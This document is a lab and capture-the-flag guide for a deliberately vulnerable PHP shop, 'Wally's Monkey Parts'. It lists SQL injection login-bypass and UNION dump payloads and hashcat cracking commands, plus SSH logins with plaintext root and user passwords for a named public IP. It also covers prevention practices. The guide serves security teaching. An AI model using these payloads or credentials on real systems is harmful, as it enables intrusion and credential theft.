# Wally's Monkey Parts - SQL Injection Demo Guide

## 🎯 Demo Objective
Demonstrate SQL injection vulnerability to:
1. Bypass authentication
2. Dump MD5 password hashes
3. Crack hashes to get plaintext passwords  
4. Use credentials to SSH into the server

## 🔧 Setup Instructions

### Database Setup
The database includes:
- **Users table** with MD5 hashed passwords
- **Products table** with monkey-themed hardware
- **Sensitive_data table** with SSH credentials and secrets
- **System_config table** with configuration data

### User Accounts
| Username | Password | MD5 Hash | Role | SSH Access |
|----------|----------|----------|------|------------|
| admin | MonkeyBusiness123! | `md5 hash` | admin | Yes |
| wally | WallyParts2024! | `md5 hash` | owner | Yes |
| john | password123 | 482c811da5d5b4bc6d497ffa98491e38 | customer | No |
| testuser | test123 | cc03e747a6afbbcbf8be7668acfebee5 | customer | No |

## 🎭 Attack Demonstration Steps

### Step 1: Initial Reconnaissance
1. Navigate to `http://155.138.197.128/wallys_login.php`
2. Try normal login to observe behavior
3. Note error messages

### Step 2: SQL Injection - Authentication Bypass
```sql
Username: admin' --
Password: anything

OR

Username: ' OR '1'='1' --
Password: anything

OR

Username: admin' /*
Password: anything
```

### Step 3: Explore the Dashboard
Once logged in as admin:
- View MD5 password hashes
- Note SSH credentials
- Find the flag

### Step 4: Advanced SQL Injection - UNION Attack
In the product search field, use UNION to dump data:

```sql
# Find number of columns
' UNION SELECT 1,2,3,4,5,6,7 --

# Dump user credentials
' UNION SELECT id,username,password,email,role,null,null FROM users --

# Dump sensitive data
' UNION SELECT 1,data_type,data_value,'SECRET',null,null,null FROM sensitive_data --

# Get database information
' UNION SELECT 1,database(),user(),version(),null,null,null --

# List all tables
' UNION SELECT 1,table_name,null,null,null,null,null FROM information_schema.tables WHERE table_schema='wallys_monkey_parts' --
```

### Step 5: Crack MD5 Hashes
1. Copy the MD5 hashes from the dashboard
2. Use online tools:
   - https://crackstation.net
   - https://md5decrypt.net
   - https://hashkiller.io/listmanager
3. Or use hashcat/john locally:
```bash
echo "hash_here" > hash.txt
hashcat -m 0 hash.txt rockyou.txt
```

### Step 6: SSH Access
With cracked credentials:
```bash
ssh root@155.138.197.128
# Password: MonkeyRoot2024!

# Alternative:
ssh wally@155.138.197.128  
# Password: WallyParts2024!
```

## 🛡️ Prevention Methods (Educational)

### Secure Code Example
```php
// SECURE: Using prepared statements
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, md5($password));
$stmt->execute();
```

### Security Best Practices
1. **Never concatenate user input** directly into SQL queries
2. **Use prepared statements** or parameterized queries
3. **Don't use MD5** for password hashing (use bcrypt/argon2)
4. **Implement input validation** and sanitization
5. **Use least privilege** for database users
6. **Hide error messages** in production
7. **Implement WAF** (Web Application Firewall)
8. **Regular security audits** and penetration testing

## 🎓 Learning Points

### What This Demo Shows:
- How SQL injection works
- Why MD5 is insecure for passwords
- The danger of exposed password hashes
- How one vulnerability can compromise entire systems
- The importance of defense in depth

### Red Flags in Code:
```php
// VULNERABLE - Direct concatenation
$query = "SELECT * FROM users WHERE username = '$username'";

// VULNERABLE - MD5 hashing
$password = md5($_POST['password']);

// VULNERABLE - Detailed error messages
echo "SQL Error: " . $e->getMessage();
```

## 🚩 Capture The Flag
Find these flags during your exploration:
- Main Flag: `FLAG{W4llys_M0nk3y_SQL_Inj3ct10n}`
- Hidden in sensitive_data table
- Accessible only to admin users

## ⚠️ Legal Notice
This lab is for **EDUCATIONAL PURPOSES ONLY**. Only use these techniques:
- In authorized lab environments
- With explicit written permission
- For legitimate security testing
- Never on production systems without authorization

## 📝 Notes for Instructors
- Ensure lab is isolated from production networks
- Monitor student access and usage
- Reset database between sessions
- Discuss ethical implications
- Emphasize responsible disclosure